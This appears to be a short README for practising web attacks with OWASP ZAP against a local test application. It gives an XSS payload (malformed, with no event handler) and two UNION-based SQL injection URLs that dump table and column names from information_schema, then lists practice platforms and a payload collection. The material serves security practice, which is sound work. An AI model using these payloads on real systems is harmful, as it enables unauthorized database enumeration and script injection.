# Owasp Zap testing

## Run web application
```
./script/build.sh
./script/deploy.sh
```

## Payload to exploit xss
```
<img src=trung alert("hello world") />
```

## Payload to exploit sql injection by union with information schema
```
Dump all tables: http://0.0.0.0/sqliUnion.php?id=11+union+select+1,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database() 
Dump all columns in table: http://0.0.0.0/sqliUnion.php?id=11+union+select+1,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27
```

## Environment to practice 
```
https://www.root-me.org/?page=news&lang=en -> web client and web server
https://tryhackme.com/dashboard -> network
https://www.hackthebox.com/ -> web and network
https://ctf.hacker101.com/ -> web
```

## Payload of all things
`https://github.com/swisskyrepo/PayloadsAllTheThings`